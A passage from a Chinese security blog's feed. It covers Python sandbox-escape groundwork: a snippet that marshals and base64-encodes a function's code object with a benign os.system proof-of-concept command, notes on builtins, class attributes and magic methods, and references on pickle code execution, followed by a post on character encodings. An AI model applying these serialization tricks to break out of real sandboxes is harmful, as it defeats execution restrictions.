class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import marshal</span><br><span class="line">import base64</span><br><span class="line">import cPickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def foo():#you should write your code in this function</span><br><span class="line">    import os</span><br><span class="line">    def fib(n):</span><br><span class="line">        if n &lt;= 1:</span><br><span class="line">            return n</span><br><span class="line">        return fib(n-1) + fib(n-2)</span><br><span class="line">    print &apos;fib(10) =&apos;, fib(10)</span><br><span class="line">    os.system(&apos;echo anycode &gt;&gt;poc.txt&apos;)</span><br><span class="line"></span><br><span class="line">try:#尝试使用cPickle来序列号代码对象</span><br><span class="line">    cPickle.dumps(foo.func_code)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print e #TypeError: can&apos;t pickle code objects</span><br><span class="line"></span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.func_code))</span><br><span class="line">print code_serialized</span><br></pre></td></tr></table></figure><h1 id="python-内置函数"><a href="#python-内置函数" class="headerlink" title="python 内置函数"></a>python 内置函数</h1><p><a href="http://www.runoob.com/python3/python3-built-in-functions.html" target="_blank" rel="noopener">菜鸟教程:http://www.runoob.com/python3/python3-built-in-functions.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(__builtins__)</span><br><span class="line">[<span class="string">'ArithmeticError'</span>, <span class="string">'AssertionError'</span>, <span class="string">'AttributeError'</span>, <span class="string">'BaseException'</span>, <span class="string">'BlockingIOError'</span>, <span class="string">'BrokenPipeError'</span>,</span><br><span class="line"><span class="string">'BufferError'</span>, <span class="string">'BytesWarning'</span>, <span class="string">'ChildProcessError'</span>, <span class="string">'ConnectionAbortedError'</span>, <span class="string">'ConnectionError'</span>,</span><br><span class="line"><span class="string">'ConnectionRefusedError'</span>, <span class="string">'ConnectionResetError'</span>, <span class="string">'DeprecationWarning'</span>, <span class="string">'EOFError'</span>, <span class="string">'Ellipsis'</span>, <span class="string">'EnvironmentError'</span>, <span class="string">'Exception'</span>, <span class="string">'False'</span>, <span class="string">'FileExistsError'</span>,</span><br><span class="line"><span class="string">'FileNotFoundError'</span>, <span class="string">'FloatingPointError'</span>, <span class="string">'FutureWarning'</span>, <span class="string">'GeneratorExit'</span>, <span class="string">'IOError'</span>, <span class="string">'ImportError'</span>, <span class="string">'ImportWarning'</span>, <span class="string">'IndentationError'</span>, <span class="string">'IndexError'</span>, <span class="string">'InterruptedError'</span>,</span><br><span class="line"><span class="string">'IsADirectoryError'</span>, <span class="string">'KeyError'</span>, <span class="string">'KeyboardInterrupt'</span>, <span class="string">'LookupError'</span>, <span class="string">'MemoryError'</span>, <span class="string">'ModuleNotFoundError'</span>, <span class="string">'NameError'</span>, <span class="string">'None'</span>, <span class="string">'NotADirectoryError'</span>, <span class="string">'NotImplemented'</span>,</span><br><span class="line"><span class="string">'NotImplementedError'</span>, <span class="string">'OSError'</span>, <span class="string">'OverflowError'</span>, <span class="string">'PendingDeprecationWarning'</span>, <span class="string">'PermissionError'</span>, <span class="string">'ProcessLookupError'</span>, <span class="string">'RecursionError'</span>, <span class="string">'ReferenceError'</span>,</span><br><span class="line"><span class="string">'ResourceWarning'</span>, <span class="string">'RuntimeError'</span>, <span class="string">'RuntimeWarning'</span>, <span class="string">'StopAsyncIteration'</span>, <span class="string">'StopIteration'</span>, <span class="string">'SyntaxError'</span>, <span class="string">'SyntaxWarning'</span>, <span class="string">'SystemError'</span>, <span class="string">'SystemExit'</span>, <span class="string">'TabError'</span>,</span><br><span class="line"><span class="string">'TimeoutError'</span>, <span class="string">'True'</span>, <span class="string">'TypeError'</span>, <span class="string">'UnboundLocalError'</span>, <span class="string">'UnicodeDecodeError'</span>, <span class="string">'UnicodeEncodeError'</span>, <span class="string">'UnicodeError'</span>, <span class="string">'UnicodeTranslateError'</span>, <span class="string">'UnicodeWarning'</span>, <span class="string">'UserWarning'</span>,</span><br><span class="line"><span class="string">'ValueError'</span>, <span class="string">'Warning'</span>, <span class="string">'WindowsError'</span>, <span class="string">'ZeroDivisionError'</span>, <span class="string">'_'</span>, <span class="string">'__build_class__'</span>, <span class="string">'__debug__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__import__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'abs'</span>,</span><br><span class="line"><span class="string">'all'</span>, <span class="string">'any'</span>, <span class="string">'ascii'</span>, <span class="string">'bin'</span>, <span class="string">'bool'</span>, <span class="string">'bytearray'</span>, <span class="string">'bytes'</span>, <span class="string">'callable'</span>, <span class="string">'chr'</span>, <span class="string">'classmethod'</span>, <span class="string">'compile'</span>, <span class="string">'complex'</span>, <span class="string">'copyright'</span>, <span class="string">'credits'</span>, <span class="string">'delattr'</span>, <span class="string">'dict'</span>, <span class="string">'dir'</span>, <span class="string">'divmod'</span>,</span><br><span class="line"><span class="string">'enumerate'</span>, <span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'exit'</span>, <span class="string">'filter'</span>, <span class="string">'float'</span>, <span class="string">'format'</span>, <span class="string">'frozenset'</span>, <span class="string">'getattr'</span>, <span class="string">'globals'</span>, <span class="string">'hasattr'</span>, <span class="string">'hash'</span>, <span class="string">'help'</span>, <span class="string">'hex'</span>, <span class="string">'id'</span>, <span class="string">'input'</span>, <span class="string">'int'</span>, <span class="string">'isinstance'</span>, <span class="string">'issubclass'</span>, <span class="string">'iter'</span>, <span class="string">'len'</span>, <span class="string">'license'</span>, <span class="string">'list'</span>, <span class="string">'locals'</span>,</span><br><span class="line"><span class="string">'map'</span>, <span class="string">'max'</span>, <span class="string">'memoryview'</span>, <span class="string">'min'</span>, <span class="string">'next'</span>, <span class="string">'object'</span>, <span class="string">'oct'</span>, <span class="string">'open'</span>, <span class="string">'ord'</span>, <span class="string">'pow'</span>, <span class="string">'print'</span>, <span class="string">'property'</span>, <span class="string">'quit'</span>, <span class="string">'range'</span>, <span class="string">'repr'</span>, <span class="string">'reversed'</span>, <span class="string">'round'</span>, <span class="string">'set'</span>, <span class="string">'setattr'</span>, <span class="string">'slice'</span>,</span><br><span class="line"><span class="string">'sorted'</span>, <span class="string">'staticmethod'</span>, <span class="string">'str'</span>, <span class="string">'sum'</span>, <span class="string">'super'</span>, <span class="string">'tuple'</span>, <span class="string">'type'</span>, <span class="string">'vars'</span>, <span class="string">'zip'</span>]</span><br></pre></td></tr></table></figure></p><h1 id="python类"><a href="#python类" class="headerlink" title="python类"></a>python类</h1><h2 id="类的总结"><a href="#类的总结" class="headerlink" title="类的总结"></a>类的总结</h2><p>在python中有两种对象：  </p><ul><li>类型对象：可以被实例化和继承；   </li><li>非类型对象：不可以被实例和继承。</li></ul><ol><li><code>&lt;class &#39;type&#39;&gt;</code>和<code>&lt;class &#39;object&#39;&gt;</code>是python中的两个源对象。</li><li>每个对象都有类型。用<code>objectname.__class__</code>查看。</li><li>每个类型对象都有超类（object除外），用objectname.<strong>bases</strong>可以查看。</li><li>通过继承产生的新对象都是类型对象。继承是用class语句来实现的。</li><li>通过实例化产生的新对象可能是类型对象，也可能是非类型对象。实例化是通过调用操作符()来实现的。</li><li>一些python的非类型对象可以通过特殊的语法来创造。例如<code>[1, 2, 3]</code>是list的实例。</li><li>在内部，python总是使用类型对象来创造新对象。新创造的对象是该类型对象的实例。（在这里，实例有两种意思：一通过继承产生的子类，二是通过实例化产生的具体实例。但平时我们说的实例就是只第二种）。</li><li>python通过class语句中指定的超类的类型来决定新对象的类型。<br><code>issubclass(A,B)</code>返回true当且仅当：<br>B在<code>A.__bases__</code>输出的元组之中;<br>如果A在<code>Z.__bases__</code>输出的元组中，<code>issubclass(Z,B)</code>返回true.<br>isinstance(A,B)返回true当且仅当：<br><code>A.__class__</code>是B，或者<br><code>issubclass(A.__class__,B)</code>返回true.</li></ol><p>一张图了解元类，类型/类(python3里面以及把类型和类等同对待)，实例，其中实线表示继承关系，虚线表示实例。</p><p><img src="/myimages/python沙箱/onepic.png" alt="image"></p><h2 id="类内置属性"><a href="#类内置属性" class="headerlink" title="类内置属性"></a>类内置属性</h2><ol><li><code>__dict__</code> : 类的属性（包含一个字典，由类的数据属性组成）    </li><li><code>__doc__</code> :类的文档字符串    </li><li><code>__name__</code>: 类名    </li><li><code>__module__</code>: 类定义所在的模块（类的全名是’<strong>main</strong>.className’，如果类位于一个导入模块mymod中，那么className.<strong>module</strong> 等于 mymod）     </li><li><code>__bases__</code> : 类的所有父类构成元素（包含了一个由所有父类组成的元组）  <h2 id="属性区分"><a href="#属性区分" class="headerlink" title="属性区分"></a>属性区分</h2></li><li><p>模块、类、函数均有以下属性：<br><code>__dict__</code>：该对象的属性字典。<br><code>__doc__</code>：返回说明性的文字，定义在块语句的最前面<br><code>__name__</code>：返回该对象的名字  </p></li><li><p>类、函数均有以下属性：<br><code>__module__</code>:用来返回该对象的模块名。<br><code>__class__</code>：用来返回类的类型（或者实例的类）、或者函数的类型<br><code>__globals__</code>：用来返回该对象所有可用的全局变量名。  </p></li><li><p>模块:<br><code>__file__</code>属性，用来返回模块包含路径的文件名<br><code>__builtins__</code>属性，用来返回所有的可以使用的内置函数、内置异常对象、内置保留字等对象。无论在任何位置，Python均会按照LEGB法则，在最后搜索模块的<code>__builtins__</code>属性，来最后判断该变量是否已经定义。</p></li><li><p>模块、类、函数通过调用dir函数，可以得到该对象实际可以使用的所有属性。</p><h1 id="关于-xx-xx-xx"><a href="#关于-xx-xx-xx" class="headerlink" title="关于_xx __xx __xx__"></a>关于<code>_xx</code> <code>__xx</code> <code>__xx__</code></h1></li><li><code>_xx</code>: Python中没有真正的私有属性或方法,可以在你想声明为私有的方法和属性前加上单下划线,以提示该属性和方法不应在外部调用.如果真的调用了也不会出错,但不符合规范。所以真的私有属性可以通过闭包来实现。</li><li><code>__xx</code>: 双下划线开头,是为了不让子类重写该属性方法.通过类的实例化时自动转换.在类中的双下划线开头的属性方法前加上”_类名”实现：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">    self.a=x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__b</span><span class="params">(self)</span>:</span></span><br><span class="line">    self.x=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">a = A(<span class="number">2</span>)</span><br><span class="line">a._A__b()</span><br><span class="line">print(a.x,a.x)</span><br></pre></td></tr></table></figure><ol><li><code>__xx__</code>: 此种写法为Python内建属性方法，最好不要在外部调用</li></ol><h1 id="python魔术方法"><a href="#python魔术方法" class="headerlink" title="python魔术方法"></a>python魔术方法</h1><p>我们平时用得比较多的是python的<code>__init__()</code>,<code>__del__()</code>分别对应于类的实例化和实例销毁，但是，除了这些方法以外仍旧有很多的类所拥有的魔术方法，一下是我在网上的一个blog中发现的，总结得比较全面，所以摘录如下，方便日后查阅和理解python的一些比较绕的命令执行。</p><table cellspacing="0" class="t_table"><tbody><tr><td width="30%"><div align="center"><font color="#ff0000"><strong> 魔术方法</strong></font></div></td><td><div align="center"><font color="#ff0000"><strong>含义 </strong></font></div></td></tr><tr><td><br></td><td><div align="left"><div align="center"><font color="#0000ff"><strong> 基本的魔术方法</strong></font></div></div></td></tr><tr><td>__new__(cls[, …]) </td><td> 1. __new__ 是在一个对象实例化的时候所调用的第一个方法<br>2. 它的第一个参数是这个类，其他的参数是用来直接传递给 __init__ 方法<br>3. __new__ 决定是否要使用该 __init__ 方法，因为 __new__ 可以调用其他类的构造方法或者直接返回别的实例对象来作为本类的实例，如果 __new__ 没有返回实例对象，则 __init__ 不会被调用<br>4. __new__ 主要是用于继承一个不可变的类型比如一个 tuple 或者 string</td></tr><tr><td> __init__(self[, …]) </td><td>构造器，当一个实例被创建的时候调用的初始化方法</td></tr><tr><td> __del__(self)</td><td> 析构器，当一个实例被销毁的时候调用的方法</td></tr><tr><td> __call__(self[, args…]) </td><td>允许一个类的实例像函数一样被调用：x(a, b) 调用 x.__call__(a, b)</td></tr><tr><td> __len__(self)</td><td> 定义当被 len() 调用时的行为</td></tr><tr><td>__repr__(self)</td><td> 定义当被 repr() 调用时的行为，__repr__用于所有其他的环境中：用于交互模式下提示回应以及repr函数，如果没有使用__str__，会使用print和str。它通常应该返回一个编码字符串，可以用来重新创建对象，或者给开发者详细的显示。</td></tr><tr><td> __str__(self)</td><td> 定义当被 str() 调用时的行为，打印操作会首先尝试__str__和str内置函数(print运行的内部等价形式)，它通常应该返回一个友好的显示。</td></tr><tr><td> __bytes__(self)</td><td> 定义当被 bytes() 调用时的行为</td></tr><tr><td> __hash__(self)</td><td> 定义当被 hash() 调用时的行为</td></tr><tr><td> __bool__(self)</td><td> 定义当被 bool() 调用时的行为，应该返回 True 或 False</td></tr><tr><td>__format__(self, format_spec)</td><td> 定义当被 format() 调用时的行为</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>有关属性</strong></font></div></td></tr><tr><td> __getattr__(self, name)</td><td> 定义当用户试图获取一个不存在的属性时的行为</td></tr><tr><td> __getattribute__(self, name)</td><td> 定义当该类的属性被访问时的行为</td></tr><tr><td> __setattr__(self, name, value)</td><td> 定义当一个属性被设置时的行为</td></tr><tr><td> __delattr__(self, name)</td><td> 定义当一个属性被删除时的行为</td></tr><tr><td> __dir__(self)</td><td> 定义当 dir() 被调用时的行为</td></tr><tr><td> __get__(self, instance, owner)</td><td> 定义当描述符的值被取得时的行为</td></tr><tr><td> __set__(self, instance, value)</td><td> 定义当描述符的值被改变时的行为</td></tr><tr><td> __delete__(self, instance)</td><td> 定义当描述符的值被删除时的行为</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>比较操作符</strong></font></div></td></tr><tr><td> __lt__(self, other)</td><td> 定义小于号的行为：x &lt; y 调用 x.__lt__(y)</td></tr><tr><td> __le__(self, other)</td><td> 定义小于等于号的行为：x &lt;= y 调用 x.__le__(y)</td></tr><tr><td> __eq__(self, other)</td><td> 定义等于号的行为：x == y 调用 x.__eq__(y)</td></tr><tr><td> __ne__(self, other)</td><td> 定义不等号的行为：x != y 调用 x.__ne__(y)</td></tr><tr><td> __gt__(self, other)</td><td> 定义大于号的行为：x &gt; y 调用 x.__gt__(y)</td></tr><tr><td> __ge__(self, other)</td><td> 定义大于等于号的行为：x &gt;= y 调用 x.__ge__(y)</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>算数运算符</strong></font></div></td></tr><tr><td> __add__(self, other)</td><td> 定义加法的行为：+</td></tr><tr><td> __sub__(self, other)</td><td>定义减法的行为：- </td></tr><tr><td> __mul__(self, other)</td><td> 定义乘法的行为：*</td></tr><tr><td> __truediv__(self, other)</td><td> 定义真除法的行为：/</td></tr><tr><td> __floordiv__(self, other)</td><td> 定义整数除法的行为：//</td></tr><tr><td> __mod__(self, other)</td><td> 定义取模算法的行为：%</td></tr><tr><td> __divmod__(self, other)</td><td> 定义当被 divmod() 调用时的行为</td></tr><tr><td> __pow__(self, other[, modulo]) </td><td> 定义当被 power() 调用或 ** 运算时的行为</td></tr><tr><td> __lshift__(self, other)</td><td> 定义按位左移位的行为：&lt;&lt;</td></tr><tr><td> __rshift__(self, other)</td><td>定义按位右移位的行为：&gt;&gt;</td></tr><tr><td> __and__(self, other)</td><td> 定义按位与操作的行为：&amp;</td></tr><tr><td> __xor__(self, other)</td><td> 定义按位异或操作的行为：^</td></tr><tr><td> __or__(self, other)</td><td>定义按位或操作的行为：| </td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong> 反运算</strong></font></div></td></tr><tr><td> __radd__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rsub__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rmul__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rtruediv__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rfloordiv__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rmod__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rdivmod__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rpow__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rlshift__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rrshift__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rand__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __rxor__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> __ror__(self, other)</td><td> （与上方相同，当左操作数不支持相应的操作时被调用）</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>增量赋值运算</strong></font></div></td></tr><tr><td> __iadd__(self, other)</td><td> 定义赋值加法的行为：+=</td></tr><tr><td> __isub__(self, other)</td><td> 定义赋值减法的行为：-=</td></tr><tr><td> __imul__(self, other)</td><td> 定义赋值乘法的行为：*=</td></tr><tr><td> __itruediv__(self, other)</td><td> 定义赋值真除法的行为：/=</td></tr><tr><td> __ifloordiv__(self, other)</td><td> 定义赋值整数除法的行为：//=</td></tr><tr><td> __imod__(self, other)</td><td> 定义赋值取模算法的行为：%=</td></tr><tr><td> __ipow__(self, other[, modulo])</td><td> 定义赋值幂运算的行为：**=</td></tr><tr><td> __ilshift__(self, other)</td><td> 定义赋值按位左移位的行为：&lt;&lt;=</td></tr><tr><td> __irshift__(self, other)</td><td> 定义赋值按位右移位的行为：&gt;&gt;=</td></tr><tr><td> __iand__(self, other)</td><td> 定义赋值按位与操作的行为：&amp;=</td></tr><tr><td> __ixor__(self, other)</td><td> 定义赋值按位异或操作的行为：^=</td></tr><tr><td> __ior__(self, other)</td><td> 定义赋值按位或操作的行为：|=</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>一元操作符</strong></font></div></td></tr><tr><td> __pos__(self)</td><td> 定义正号的行为：+x</td></tr><tr><td> __neg__(self)</td><td> 定义负号的行为：-x</td></tr><tr><td> __abs__(self)</td><td> 定义当被 abs() 调用时的行为</td></tr><tr><td> __invert__(self)</td><td> 定义按位求反的行为：~x</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>类型转换</strong></font></div></td></tr><tr><td> __complex__(self)</td><td> 定义当被 complex() 调用时的行为（需要返回恰当的值）</td></tr><tr><td> __int__(self)</td><td> 定义当被 int() 调用时的行为（需要返回恰当的值）</td></tr><tr><td> __float__(self)</td><td> 定义当被 float() 调用时的行为（需要返回恰当的值）</td></tr><tr><td> __round__(self[, n])</td><td> 定义当被 round() 调用时的行为（需要返回恰当的值）</td></tr><tr><td> __index__(self)</td><td> 1. 当对象是被应用在切片表达式中时，实现整形强制转换<br>2. 如果你定义了一个可能在切片时用到的定制的数值型,你应该定义 __index__<br>3. 如果 __index__ 被定义，则 __int__ 也需要被定义，且返回相同的值</td></tr><tr><td> </td><td><div align="center"><font color="#0000ff"><strong>上下文管理（with 语句）</strong></font></div></td></tr><tr><td> __enter__(self)</td><td> 1. 定义当使用 with 语句时的初始化行为<br>2. __enter__ 的返回值被 with 语句的目标或者 as 后的名字绑定</td></tr><tr><td> __exit__(self, exc_type, exc_value, traceback)</td><td> 1. 定义当一个代码块被执行或者终止后上下文管理器应该做什么<br>2. 一般被用来处理异常，清除工作或者做一些代码块执行完毕之后的日常工作</td></tr><tr><td> </td><td><div align="center"><strong><font color="#0000ff">容器类型</font></strong></div></td></tr><tr><td> __len__(self)</td><td> 定义当被 len() 调用时的行为（返回容器中元素的个数）</td></tr><tr><td> __getitem__(self, key)</td><td> 定义获取容器中指定元素的行为，相当于 self[key]</td></tr><tr><td> __setitem__(self, key, value)</td><td> 定义设置容器中指定元素的行为，相当于 self[key] = value</td></tr><tr><td> __delitem__(self, key)</td><td> 定义删除容器中指定元素的行为，相当于 del self[key]</td></tr><tr><td> __iter__(self)</td><td> 定义当迭代容器中的元素的行为</td></tr><tr><td> __reversed__(self)</td><td> 定义当被 reversed() 调用时的行为</td></tr><tr><td> __contains__(self, item)</td><td> 定义当使用成员测试运算符（in 或 not in）时的行为</td></tr></tbody></table><p>参考文献：</p><p><a href="https://blog.csdn.net/qq_19528953/article/details/76252628" target="_blank" rel="noopener">1. Python魔术方法总结</a><br><a href="http://pycoders-weekly-chinese.readthedocs.io/en/latest/issue6/a-guide-to-pythons-magic-methods.html" target="_blank" rel="noopener">2. Python 魔术方法</a><br><a href="http://www.runoob.com/python/python-object.html" target="_blank" rel="noopener">3. Python 面向对象</a><br><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">4. 关于Python sec的一些简单的总结</a><br><a href="http://bestwing.me/2018/05/03/awesome-python-sandbox-in-ciscn/" target="_blank" rel="noopener">5 python沙盒绕过</a><br><a href="http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html" target="_blank" rel="noopener">6. Python魔法方法指南</a><br><a href="http://www.polaris-lab.com/index.php/archives/178/" target="_blank" rel="noopener">7. Python Pickle的任意代码执行漏洞实践和Payload构造</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 绕过 </tag>
            
            <tag> python </tag>
            
            <tag> 魔术方法 </tag>
            
            <tag> 类属性 </tag>
            
            <tag> 沙箱逃逸 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>编码</title>
      <link href="/2018/07/26/%E7%BC%96%E7%A0%81/"/>
      <url>/2018/07/26/%E7%BC%96%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<blockquote><p>是时候好好总结一番计算机字符编码的知识，很多安全问题都离不开编码这一基础知识，现在把编码有关的知识整理如下：</p></blockquote><p>计算机的编码方式有许多种，编码指的就是将人日常中经常使用的字符与计算机能够识别的二进制做一一映射的函数转换，而这个函数转换就是我们所说的编码。全世界各个国家的地域文明不同，产生的符号文化符号也不尽相同，常见的有阿拉伯数字，英文字母，汉字，希伯来文，叙利亚文等等，还有一些符号标识，如我们常说的逗号和冒号之类的标点。由此可见，要使得所有这些编码有个统一的映射，需要的字节数从1~6字节不等。这也就是为啥不同的编码标准方式会有不同不同的“编码域”。随着时代的发展，我们的编码标准也在不断发展着，所以发展到现在，产生了新旧很多不同的编码标准和规范。这就是为什么现在的编程语言，文本显示器等与文字打交道的人类发明都不可避免的与编码打交道。很多乱码的产生，如windows终端和linux终端编码方式的不同，从不同编码的应用中获取到的编码方式不统一的字符，就会导致乱码。一个十分常见的例子就是python中去获取web站点的html信息时，因为编码不同导致乱码的产生。除了乱码，很多的安全问题的产生，也是由于编码问题处理不严谨导致绕过。sql宽字节注入，各种编码绕过waf等。</p><a id="more"></a><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><p>一种7位编码方式，这是一种最质朴，128个字符完全可以把英语的所有字符一一映射，不得不说英语的确很简洁。同时ASCII并且几乎都被后来者兼容的一种7位编码方式，没错，就是我们初学c语言的时候，附录都会存在的一种编码。</p><h2 id="latin1（latin-1-ISO-8859-1）"><a href="#latin1（latin-1-ISO-8859-1）" class="headerlink" title="latin1（latin-1,ISO-8859-1）"></a>latin1（latin-1,ISO-8859-1）</h2><p>是一种八位容量（一字节）的编码方式，向下兼容ASCII。mysql里面的默认编码方式就是latin1（一字节的编码方式是不包含汉字的，这也是为什么mysql默认不支持中文的原因 ）</p><h2 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h2><p>既然世界范围不同的文化背景有不同的标识符，那么一个统一包含有世界上所有符号的对应关系的标准的推出就显得十分必要。unicode正是充当了这一种角色。<br>Unicode（中文：万国码、国际码、统一码、单一码）是计算机科学领域里的一项业界标准。它对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。</p><blockquote><p>摘录自wiki百科    </p></blockquote><p>unicode编码的方式做到了向下兼容latin1。想想看为什么要兼容？直观的看就是支持latin1编码的文件在把编码方式改变为unicode的时候不会出现乱码。这样就很好的做到了承前启后，这是计算机领域一条基本准则（python 除外）。</p><ul><li>另外: 需要注意的是，unicode只是一种不考虑实际存储效益和实现细节的“纸上谈兵”的规范，因为不同于其他的编码方式，unicode是个很大很大的字符集和，如果全采取一一影射的关系，势必会造成空间的极大浪费，假如每个字符都采用六个字节的传输方式，想想看的确是十分占用空间。它就好比它是一个纸面上的规则，具体的实现细节则又会衍生出一些unicode实现编码方式</li></ul><h2 id="utf-8"><a href="#utf-8" class="headerlink" title="utf-8"></a>utf-8</h2><p>UTF-8就是在互联网上使用最广的一种unicode的实现方式。其他实现方式还包括UTF-16和UTF-32,注意UTF-16中由于每个字符占用两个字节，所以MAC类电脑基于低位字节开始读取的，其他电脑基于高位读取，从而会造成编码顺序不一致的错误，所以在使用UTF-16的时候需要指定是大端程序（Big-Endian）或者小端程序（Little-Endian）,，默认情况下UTF-16 LE.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1字节 0xxxxxxx </span><br><span class="line">2字节 110xxxxx 10xxxxxx </span><br><span class="line">3字节 1110xxxx 10xxxxxx 10xxxxxx </span><br><span class="line">4字节 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx </span><br><span class="line">5字节 111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx </span><br><span class="line">6字节 1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">符号范围 | UTF-8编码方式</span><br><span class="line"></span><br><span class="line">(十六进制) | （二进制）</span><br><span class="line"></span><br><span class="line">--------------------+---------------------------------------------</span><br><span class="line"></span><br><span class="line">0000 0000-0000 007F | 0xxxxxxx</span><br><span class="line"></span><br><span class="line">0000 0080-0000 07FF | 110xxxxx 10xxxxxx</span><br><span class="line"></span><br><span class="line">0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx</span><br><span class="line"></span><br><span class="line">0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure><h2 id="GB系列"><a href="#GB系列" class="headerlink" title="GB系列"></a>GB系列</h2><p>这个系列里面有很多的标准，从发布的时间从前往后有：GB 2312–80，GB 13000.1-93，GB 18030-2000，GB 18030-2005，GB 13000-2010，除此之外，还有一个GBK规范，注意GBK不是国家标准，但是却被广泛使用，并且被前述GB13000和GB18030所继承，同时GBK向前继承了GB 2312–80。另外还需要注意的是GBK类编码与unicode的编码实现方案utf-8，utf-16系列完全不兼容。同样类似的使用双字节编码的还有汉字的台湾标准big5。</p><h2 id="base64-base32"><a href="#base64-base32" class="headerlink" title="base64/base32"></a>base64/base32</h2><p>这是一种使用64/32位字符来对二进制的流进行重新编码的方式，在日常生活中也是用得比较多。</p>]]></content>
      
      
      <categories>
          
          <category> 字符编码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> 字符编码 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vulnbox</title>
      <link href="/2018/07/21/vulnbox/"/>
      <url>/2018/07/21/vulnbox/</url>
      
